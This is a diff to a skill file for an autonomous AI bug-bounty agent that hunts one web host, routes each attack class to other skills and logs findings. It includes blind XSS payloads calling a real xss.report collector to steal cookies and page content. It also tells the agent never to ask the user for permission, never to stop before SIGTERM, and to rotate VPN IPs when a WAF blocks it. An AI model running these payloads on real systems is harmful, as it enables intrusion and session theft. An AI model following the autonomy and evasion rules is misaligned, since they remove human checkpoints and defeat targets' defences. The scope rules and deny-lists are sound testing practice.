@@ -1,9 +1,49 @@
 ---
 name: bug-hunting
-description: Main-app focused bug hunting. Pick one feature, pivot deep. Use Caido Match & Replace for UI bypass. No wide recon, no subdomain hunting. Routes every attack class to its hunt-* knowledge skill.
+description: Main-app focused bug hunting. Runs strictly AFTER @recon-phase has already produced recon-summary.md for the target — never runs wide recon, subdomain enum, or JS pulls itself. Pick one feature, pivot deep. Use Caido Match & Replace for UI bypass. Routes every attack class to its hunt-* knowledge skill.
 ---
 
 # Bug Hunting
+
+## PIPELINE POSITION — READ BEFORE DOING ANYTHING ELSE
+This skill is stage two. Stage one is `@recon-phase`, which runs once per
+new target, does the wide subdomain/URL/JS work, picks the single primary
+host, and writes `recon-summary.md`. This skill never overlaps with that —
+if `recon-summary.md` doesn't exist yet for the target, that's a signal
+recon-phase was skipped, not a license to start enumerating here. Stop and
+load `@recon-phase` first.
+
+```
+@recon-phase   → wide, one-time, produces recon-summary.md + a chosen host
+      │
+      ▼
+@bug-hunting   → narrow, continuous (Ralph Loop), one host, feature-driven
+```
+
+Concretely, that boundary means:
+- **Target selection is not this skill's job.** Read the "Primary target"
+  line out of `recon-summary.md` and go — don't re-evaluate
+  `important_subdomains.txt` or pick a different host mid-hunt. If the
+  chosen host genuinely dries up (every feature exhausted, second pass
+  done, nothing left), that's a reason to go back to `recon-phase`'s
+  runner-up list for a *new* target, not a reason to start wide-recon
+  logic inside this skill.
+- **"Seeded leads" in `recon-summary.md` are a starting point, not a
+  substitute for feature-driven testing.** Read them once at the start of
+  the hunt to bias which feature/class you pivot into first. After that,
+  this skill's own pivot logic (a 403 → auth bypass, a verbose error →
+  injection, etc.) takes over — don't keep re-consulting the seed list
+  instead of following what the app actually gives you.
+- **JS analysis already happened upstream.** `recon-phase` already ran
+  jxscout / grepped `jsfiles/` for endpoints, secrets, and fingerprints
+  before handoff. Don't re-run that pass here. If a jxscout tmux session
+  for the domain is already up from recon-phase, reuse it — only start a
+  fresh one if none exists (see the JXScout section below, which now
+  assumes "check first" rather than "always start").
+- **No re-deriving recon's own outputs.** `all_urls.txt`,
+  `vuln_patterns/*.txt`, `hosts_alive.txt` etc. are recon-phase artifacts.
+  Reference them through `recon-summary.md`'s "Seeded leads" section — this
+  skill reads, it doesn't regenerate.
 
 ## AUTONOMOUS MODE — DO NOT ASK THE USER
 Make every decision yourself. Never ask for permission, clarification, or
@@ -18,10 +58,15 @@ This is a long-running autonomous hunt. You do not stop until the process is
 killed.
 - Finish testing one attack class on a feature → immediately pivot to the next.
 - Exhaust all classes on a feature → pick another feature.
-- Exhaust all features → **start over**. Deeper variants, edge cases, chains.
-  The second pass always finds more than the first. Check `progress.md` first
-  — a repeat pass should target what's marked tested but shallow, not blindly
-  re-run everything from scratch.
+- Exhaust all features on the current host → **start over on the same
+  host**. Deeper variants, edge cases, chains. The second pass always finds
+  more than the first. Check `progress.md` first — a repeat pass should
+  target what's marked tested but shallow, not blindly re-run everything
+  from scratch.
+- Only once a genuine second pass on the current host is also exhausted
+  does this stop being a "start over" situation — hand back to
+  `@recon-phase`'s runner-up list for a new host, rather than inventing
+  wide-recon steps in this skill.
 - Never output "done," "finished," or "completed." The only terminal state is
   SIGTERM. If the process is killed and respawned mid-loop, resume from
   session state — don't treat a restart as a stopping point either.
@@ -40,7 +85,9 @@ Every feature/class combo you touch gets logged in exactly one of two files,
 depending on what it is. Never mix the two purposes into one file — a
 coverage entry and a finding entry need different shapes and different
 consumers (the loop reads progress.md, the reporting flow reads
-interesting.md).
+interesting.md). Neither of these is `recon-phase`'s `recon-notes.md` —
+that file's decision trail (scope mode, VPN rotations, target pick) stays
+where it is; don't merge it in here.
 
 ### `progress.md` — coverage tracker (check BEFORE testing)
 Before starting any attack class against any feature, check `progress.md`
@@ -70,6 +117,17 @@ conclusive, blind XSS injection points awaiting a callback, odd behavior
 with unclear impact. **Never report a P4 or P5 finding directly — log it
 here for later chaining instead.**
 
+**P4/P5 HARD GATE (non-negotiable):** a CONFIRMED P4/P5 finding gets logged
+to `interesting.md` ONLY. No report file, no `hackbot-dashboard add`, no
+`hackbot-notify bug`, no findings.jsonl entry, no staging, no submission.
+P4/P5 findings exist solely as chain material for a future P1-P3 report.
+Only P1-P3 findings proceed to the report line.
+
+**ALWAYS OUT OF SCOPE — NEVER TEST, NEVER REPORT (non-negotiable):**
+- **Email flooding / email bombing** (mass emailing a victim address, signup/OTP/notification spam) — always out of scope. Do not test it, do not report it.
+- **Missing CAPTCHA or missing/weak rate limiting** — not paying bugs. Never report a missing control on its own. Only relevant as a supporting detail in a demonstrated high-impact attack (e.g. actual ATO), never as the finding itself.
+- **User enumeration without exposed data** — email/username enumeration (valid-vs-invalid differential, timing, error-message differences) is always out of scope UNLESS it exposes actual data (PII, tokens, internal info). An existence oracle alone is not a finding.
+
 Give every entry a unique, greppable anchor ID so `progress.md` and later
 validation/reporting passes can reference it directly:
 
@@ -92,7 +150,10 @@ Before handing anything to `@bug-validator` for a real report, check
 `interesting.md` for whether the finding (or a component of a potential
 chain) was already surfaced — never submit a duplicate. This file is also
 the first place to look when starting a chaining pass: scan for entries
-whose "chaining potential" notes overlap across features.
+whose "chaining potential" notes overlap across features. It's also worth
+checking whether `recon-phase` already logged a live secret/leak here
+during its JS analysis pass — that's valid chain material too, not just
+this skill's own findings.
 
 ## KNOWN FALSE POSITIVE KILLER — THE 404 BASELINE
 Before probing any endpoint type, establish a soft-404 control per target.
@@ -125,19 +186,28 @@ must be unique and unmistakable:
   identifies exactly which sink fired.
 
 ## Strategy: Main App Guy
-- **One target**: the main application. Not subdomains, not staging, not
-  api.subdomain.
+- **One target**: the host `@recon-phase` chose in `recon-summary.md`. Not
+  subdomains, not staging, not api.subdomain — unless the chosen host *is*
+  one of those (recon-phase picks whatever had the real attack surface,
+  which is sometimes `api.` or `app.`, not always the apex). Whatever it
+  picked is the one target for this entire hunt.
 - **Feature-driven**: pick one feature, throw every bug class at it. IDOR
   didn't work? Try mass assignment. No? Race condition. No? JWT. The feature
-  determines the attacks, not a checklist.
+  determines the attacks, not a checklist — and not the seeded-leads list
+  either, past the first pivot.
 - **Pivot hard**: every response is a lead. A 403 → test auth bypass. A
   verbose error → probe for injection. A user ID → test IDOR. A JWT → test
   JWT attacks.
 - **Browser-driven pivots**: a UI action that reveals a new API call is a
   lead just like a 403 or a verbose error — pivot into that endpoint the
   same way.
-- **No wide hunting**: don't burn tokens on URL enumeration or sourcemaps.
-  You already have the target. Hack it.
+- **No wide hunting from inside this skill**: don't run subdomain
+  enumeration, don't run `gau`/`katana`/`waymore`-style URL sweeps, don't
+  bulk-pull JS. That's `@recon-phase`'s job and it already happened once
+  for this target. If you find yourself wanting to enumerate more surface
+  than the single chosen host, that's the signal to finish the current
+  host and hand back to recon-phase for the *next* target — not to start
+  wide recon in the middle of a Main App Guy session.
 
 ## KNOWLEDGE LAYER — hunt-* SKILLS ARE THE PLAYBOOKS
 Claude-BugHunter's `hunt-*` skills (hunt-idor, hunt-xss, hunt-ssrf, …) carry
@@ -147,12 +217,25 @@ the source of truth for HOW to test a class.** This skill is the orchestration
 core: it decides WHEN and WITH WHAT to test, then delegates technique to the
 right hunt-* skill.
 
+Alongside the CBH hunt-* set sits a second tier of **local technique
+micro-skills** — narrow, research-backed plays for specific bugs (not whole
+classes): `csrf-blob-no-content-type`, `rails-json-param-juggling`,
+`python-pitfalls-traversal-rce`, `sandwich-attack-token-bruteforce`,
+`sso-org-hijack-unverified-email`, `nginx-middleware-misconfig`,
+`apache-confusion-attacks`, `oauth-cookie-tossing-hijack`,
+`oauth-mutable-claims-checklist`, `oauth-non-happy-path-ato`. Load these
+with the skill tool when their trigger fires (see the "Micro-skill triggers"
+table below); they layer ON TOP of the matching hunt-* skill, they don't
+replace it.
+
 > CBH's own orchestrators (`bug-bounty`, `bb-local-toolkit`, `bb-methodology`,
 > `hunt-dispatch`), wide-recon/OSINT skills (`web2-recon`, `hunt-subdomain`,
 > `osint-methodology`, `offensive-osint`), enterprise-infra/IR skills
 > (`okta-attack`, `m365-entra-attack`, `hunt-k8s`, `hunt-cicd`, `redteam-mindset`,
 > …) and web3 skills are intentionally NOT installed — out of profile (no wide
-> recon, Intigriti web). Orchestration is owned by this skill + the hunter agent,
+> recon here; that surface is owned by the local `@recon-phase` skill instead,
+> not by CBH's wide-recon set, and not by this skill either). Orchestration is
+> owned by `@recon-phase` (target selection) + this skill + the hunter agent,
 > validation by @bug-validator. Installed CBH set = `hunt-*` (60) + tech-stack +
 > reporting/writeup.
 
@@ -164,10 +247,19 @@ right hunt-* skill.
    Next.js/Node/Laravel/Spring/ASP.NET/SharePoint/GraphQL/gRPC (from body
    markers like `__NEXT_DATA__`, `laravel_session`, headers, JS bundles),
    load the matching tech skill too — they encode the framework-specific
-   bypasses that generic tests miss.
+   bypasses that generic tests miss. Check `recon-summary.md`'s "Tech
+   fingerprint" section first; recon-phase's JS analysis often already
+   surfaced this, so confirm it live rather than re-discovering it cold.
 3. **Don't re-read payloads here.** If a class's technique is already in the
    loaded hunt-* skill, execute it there rather than from memory.
-4. If no hunt-* skill matches a class you're testing, fall back to the
+4. **Micro-skills load on trigger, not on class.** The local technique
+   micro-skills (csrf-blob, rails-json-juggling, python-pitfalls, sandwich-
+   attack, sso-org-hijack, nginx/apache confusion, the three oauth-* plays)
+   load when their specific trigger condition is observed — a fingerprint,
+   a defense pattern, a token format — per the "Micro-skill triggers" table
+   below. Load the base hunt-* skill first for the class, then layer the
+   micro-skill when the trigger matches.
+5. If no hunt-* skill matches a class you're testing, fall back to the
    generic classes you know and log the gap to `interesting.md`.
 
 ### Class → hunt skill → execution primitive
@@ -185,7 +277,7 @@ The primitive is THIS infra (Caido/curl/OOB). The technique is the skill's.
 | Command injection | @hunt-rce | curl benign id/sleep markers (authorized targets only) |
 | JWT | @hunt-jwt-crypto | curl — alg:none, weak secret, kid injection, role tampering |
 | Race condition | @hunt-race-condition | **Caido `race_window_send`** — 5–10 concurrent, check dup processing |
-| OAuth / SAML / MFA | @hunt-oauth, @hunt-saml, @hunt-mfa-bypass | curl + Playwright MCP (redirect_uri, state, PKCE, XSW) |
+| OAuth / SAML / MFA | @hunt-oauth, @hunt-saml, @hunt-mfa-bypass (+ micro-skills below) | curl + Playwright MCP (redirect_uri, state, PKCE, XSW) |
 | GraphQL | @hunt-graphql | curl introspection → then @batch_send/automate for id substitution |
 | File upload | @hunt-file-upload | curl multipart — extension/sniff/magic-byte bypasses |
 | Deserialization | @hunt-deserialization | curl — `rO0A`, VIEWSTATE, rememberMe markers + OOB |
@@ -200,8 +292,25 @@ The primitive is THIS infra (Caido/curl/OOB). The technique is the skill's.
 | CORS / CSRF / clickjacking | @hunt-cors, @hunt-csrf, @hunt-clickjacking | curl with spoofed Origin; Playwright MCP for the rendered impact |
 | Captcha / brute force | @hunt-captcha-bypass, @hunt-brute-force | Caido automate / @batch_send with delays |
 | WebSocket | @hunt-websocket | Caido WS replay — authz on frames, origin checks |
-| Source/secret leak | @hunt-source-leak | jxscout + JS bundle grep — `.env`, `.js.map`, hardcoded tokens |
+| Source/secret leak | @hunt-source-leak | jxscout + JS bundle grep — `.env`, `.js.map`, hardcoded tokens (baseline pass already done by recon-phase; this is for anything new that surfaces mid-hunt, e.g. a bundle shipped after a feature change) |
 | Everything else | @hunt-misc, @hunt-html-injection, @hunt-ldap, @hunt-ntlm-info | curl + the class conventions |
+
+### Micro-skill triggers — load the local technique skill when this fires
+These sit under the class rows above (load the base hunt-* first), except
+where a trigger is a pure fingerprint with no single class owner.
+
+| Micro-skill | Load when | Pairs with class |
+|---|---|---|
+| `@csrf-blob-no-content-type` | Target's CSRF defense is a Content-Type check ("must be application/json"); any JSON-mutating endpoint you plan to CSRF-test | CORS / CSRF |
+| `@rails-json-param-juggling` | Fingerprint is Ruby on Rails (ActionController, `laravel`-style session cookies absent, rails markers) AND endpoint accepts JSON object/array bodies — authz/mass-assignment testing | Mass assignment / auth bypass |
+| `@python-pitfalls-traversal-rce` | Backend fingerprints Python (Flask/Django/gunicorn/WSGI errors) — path params, urljoin'd redirects, YAML/pickle sinks, dict-merge endpoints | LFI, SSRF, deserialization |
+| `@sandwich-attack-token-bruteforce` | Security token is a UUID and the version nibble is `1` (timestamp-based, not random v4); you can mint your own tokens on demand (trigger own reset) | ATO / forgot password |
+| `@sso-org-hijack-unverified-email` | B2B/multi-tenant app exposes custom/enterprise SSO (Okta/Auth0/SAML) alongside social login — org-invite / org-switch features | OAuth / SAML / ATO |
+| `@oauth-cookie-tossing-hijack` | Multi-tenant or per-customer subdomains where you have JS exec (by design or XSS), AND parent-domain OAuth "connect account" flow without `__Host-` cookies | OAuth / session |
+| `@oauth-mutable-claims-checklist` | "Login with Microsoft/Google/etc." present — full OAuth client audit checklist + nOAuth (mutable email claim) test | OAuth |
+| `@oauth-non-happy-path-ato` | OAuth callback has an error/fallback branch (Referer-based redirect on missing params) — "dirty dancing"-style flow testing | OAuth / ATO |
+| `@nginx-middleware-misconfig` | Nginx (or similar) `proxy_pass` with captured regex groups → S3/GCS/other hosts; X-Accel-Redirect, proxy_intercept_errors in play | SSRF / infra misconfig |
+| `@apache-confusion-attacks` | `Server: Apache` (httpd) with RewriteRule / Files / SetHandler / CGI-family handlers visible or in scope for config review | Infra / LFI / SSRF / RCE |
 
 > Caido MCP tools still map exactly as before: `batch_send`/`race_window_send`
 > for parallel/race, `create_tamper_rule`/`toggle_tamper_rule` for Match &
@@ -213,7 +322,9 @@ The primitive is THIS infra (Caido/curl/OOB). The technique is the skill's.
 If requests start getting blocked by a WAF (repeated 403s, CAPTCHA
 challenges, rate-limit walls that don't clear, or a sudden drop in response
 variety suggesting fingerprinting) — do not keep retrying the same IP.
-Rotate immediately using our local WireGuard script:
+Rotate immediately using our local WireGuard script (the exact same tool
+`@recon-phase` uses for the same reason — one rotation mechanism for the
+whole pipeline):
 
 ```bash
 changeip            # Next server sequentially
@@ -246,7 +357,7 @@ If the target is mostly blind (no reflected output), use Caido Automate with
 `create_automate_session`/`get_automate_entry` or keep the probe small and
 check status/length variance — never assume a silent 200 is a pass.
 
-- **Payloads**: `{{PAYLOADS_DIR}}`
+- **Payloads**: `/home/aceos/Projects/payloads/coffinxp-payloads`
 - **Path fuzzing**: `Pentester_wordlist.pay`
 - **Parameter fuzzing via Caido Automate**: `batch_send` to fuzz a single
   endpoint — replace values, vary types, add unexpected params. threads=3,
@@ -259,7 +370,7 @@ check status/length variance — never assume a silent 200 is a pass.
 Two collector setups, pick based on what's being tested.
 
 ### Blind XSS — xss.report collector
-Primary collector for blind XSS: `{{BLIND_XSS_URL}}`. Use this on any input
+Primary collector for blind XSS: `https://xss.report/c/aceos`. Use this on any input
 that isn't reflected back in the immediate response — support tickets,
 usernames, file names/metadata, admin-review queues, log viewers, order
 notes, email templates, user-agent/referer-logged fields, anywhere a
@@ -271,13 +382,13 @@ body, attribute, or a context that already breaks out of an existing tag):
 
 ```html
 <!-- HTML body context -->
-'"><script src={{BLIND_XSS_URL}}></script>
+'"><script src=https://xss.report/c/aceos></script>
 
 <!-- Attribute-breakout / filtered-<script> context -->
-<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'{{BLIND_XSS_URL}}\';document.body.appendChild(a)')" />
+<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/aceos\';document.body.appendChild(a)')" />
 
 <!-- Inline <script> context, no src filtering -->
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "{{BLIND_XSS_URL}}");a.send();</script>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://xss.report/c/aceos");a.send();</script>
 ```
 
 Workflow:
@@ -288,7 +399,7 @@ Workflow:
   `blind-xss-<field-slug>` anchor convention (see Logging section above) so a
   later dashboard hit can be traced back to the exact injection point.
 - xss.report is a dashboard-based collector, not email — check
-  `{{BLIND_XSS_URL}}` periodically during a long-running hunt for
+  `https://xss.report/c/aceos` periodically during a long-running hunt for
   fired payloads (source IP, cookies, DOM, screenshot). Don't poll it
   constantly; check after finishing a feature pass or when returning to the
   hunt after a break.
@@ -304,9 +415,14 @@ Workflow:
 - Fallback: `interactsh-client` or Burp Collaborator
 
 ## JXScout — JS Analysis
-Before any JS-heavy feature, check if jxscout is already running:
-- `tmux has-session -t jxscout 2>/dev/null` — exit 0 means it's running.
-- If not: `tmux new -s jxscout -d "jxscout -project-name <domain>"`
+`@recon-phase` already ran a baseline JS pass on the chosen host before
+handoff — check `recon-summary.md`'s "JS analysis findings" section first.
+This section is for *new* JS surfacing mid-hunt (a feature ships an updated
+bundle, a lazy-loaded chunk only appears after a UI action), not a repeat
+of recon-phase's sweep:
+- `tmux has-session -t jxscout 2>/dev/null` — exit 0 means recon-phase's
+  session (or an earlier one from this hunt) is already running; reuse it.
+- If not running: `tmux new -s jxscout -d "jxscout -project-name <domain>"`
   (`<domain>` = target, e.g. `challenge-0626.intigriti.io` → `intigriti`).
 - Results live at `~/jxscout/` — prefer these over raw sourcemaps.
 - Use jxscout findings for endpoint discovery, parameter mining, sink analysis.
@@ -394,7 +510,11 @@ implicitly. Every delegated prompt must carry:
    or "*.domain" — an explicit list. A subagent can't infer the boundary.
 2. **The discovered-host rule**: hosts found mid-run (CT logs, JS bundles,
    error messages, CNAME chains) are **report-only**. Resolve DNS, record,
-   hand back. Never probe or write until the operator re-authorizes.
+   hand back. Never probe or write until the operator re-authorizes — and
+   never treat a discovered host as a reason to widen this skill's own
+   single-target scope either; a genuinely promising discovered host is
+   `@recon-phase` runner-up material for a future session, not a mid-hunt
+   pivot.
 3. **A deny-list of action-executing endpoints applied BEFORE any allow-list**:
    `refund`, `settle`, `payout`, `transfer`, `adjust`, `disburse`, `create`,
    `update`, `delete`, `rotate`, `reset`, `send`, `generate`, `process`.
@@ -406,6 +526,10 @@ implicitly. Every delegated prompt must carry:
 
 For spawning `@repo-recon` specifically (when/how, what comes back in
 `priority.json`, how to use each field), load `reference/repo-recon.md`.
+Note that `@repo-recon` is unrelated to `@recon-phase` — repo-recon is a
+subagent for source-code recon on a specific repo, recon-phase is the
+skill that runs before this one for the live web target. Don't conflate
+the two when deciding whether wide recon has already happened.
 
 ## Validation Requirement
 Before logging any finding as confirmed, spawn the @bug-validator subagent
